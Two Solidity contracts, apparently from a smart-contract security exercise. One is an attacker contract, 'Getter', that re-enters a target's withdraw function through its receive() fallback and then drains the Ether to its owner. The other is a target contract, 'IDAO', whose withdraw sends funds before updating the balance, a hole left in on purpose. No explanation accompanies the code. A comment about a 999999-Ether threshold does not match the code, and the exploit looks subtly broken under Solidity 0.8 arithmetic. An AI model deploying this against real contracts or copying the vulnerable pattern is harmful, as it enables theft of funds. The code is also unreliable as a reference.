//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./IDAO.sol";

contract Getter {
	
  address payable public owner;
  address payable public dao = payable(0xcD0258F7eCd360E743a3C8dBA73135d27D6d7ac4);
  bool check;
  
  //Constructs the contract and stores the owner
  constructor() public {
  	owner = payable(msg.sender);
  }
  
  function pay() external {
    IDAO(dao).donate{value: 0.001 ether}(msg.sender);
      
  }

  //Initiates the balance withdrawal
  function callWithdrawBalance() public {
  	IDAO(dao).withdraw(0.001 ether);
  }
  
  //Fallback function for this contract.
  //If the balance of this contract is less then 999999 Ether,
  //triggers another withdrawal from the DAO.
  receive() external payable {
  	if (check == false) {
        check = true;
    	callWithdrawBalance();
    }
  }
  
  //Allows the owner to get Ether from this contract
  function drain() public {
  	owner.transfer(address(this).balance);
  }

  function flip() public {
      check = !check;
  }
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

/*interface IDAO {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}*/

contract IDAO {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}